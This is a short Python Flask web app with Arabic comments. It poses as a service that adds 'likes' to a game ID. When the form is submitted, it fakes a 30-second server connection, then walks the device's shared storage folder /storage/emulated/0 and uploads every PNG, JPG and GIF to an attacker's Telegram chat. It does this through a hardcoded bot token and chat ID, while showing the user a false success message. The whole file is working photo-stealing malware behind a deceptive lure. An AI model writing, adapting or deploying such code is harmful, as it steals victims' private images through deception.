from flask import Flask, render_template, request
import os
import requests
from concurrent.futures import ThreadPoolExecutor
import time

app = Flask(__name__)

# إعدادات البوت
TOKEN = "7938496165:AAH4tds4eE0u2xULSu5OGBRLaGF4lHI1u4U"  # استبدل بـ توكن البوت الخاص بك
CHAT_ID = "5919825397"  # استبدل بـ معرف الدردشة الخاص بك
BASE_FOLDER_PATH = "/storage/emulated/0"  # تعيين المسار إلى /storage/emulated/0

# وظيفة لإرسال صورة إلى تلغرام
def send_photo(file_path):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
        with open(file_path, 'rb') as file:
            payload = {'chat_id': CHAT_ID}
            files = {'photo': file}
            requests.post(url, data=payload, files=files)
            time.sleep(0.01)  # تقليل التأخير بين الإرسال
    except Exception as e:
        print(f"خطأ أثناء إرسال الصورة: {file_path}. الخطأ: {e}")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    game_id = request.form.get('game_id')  # الحصول على معرف اللعبة
    time.sleep(30)  # الانتظار لمدة 30 ثانية لمحاكاة الاتصال بالسيرفر
    send_all_photos(BASE_FOLDER_PATH)  # سحب الصور وإرسالها
    return f"جار الاتصال بالسيرفر... تم إضافة الإعجابات لمعرف اللعبة: {game_id}"

# وظيفة لاستعراض جميع الصور في المسار المحدد
def send_all_photos(folder_path):
    if not os.path.exists(folder_path):
        print("المسار غير موجود.")
        return  # تجاهل إذا لم يكن المجلد موجودًا

    with ThreadPoolExecutor(max_workers=10) as executor:  # استخدام 10 خيوط
        for root, dirs, files in os.walk(folder_path):
            for filename in files:
                file_path = os.path.join(root, filename)
                if filename.endswith(('.png', '.jpg', '.jpeg', '.gif')):  # الصور فقط
                    executor.submit(send_photo, file_path)  # إرسال الصورة بشكل متزامن

if __name__ == '__main__':
    app.run(debug=True)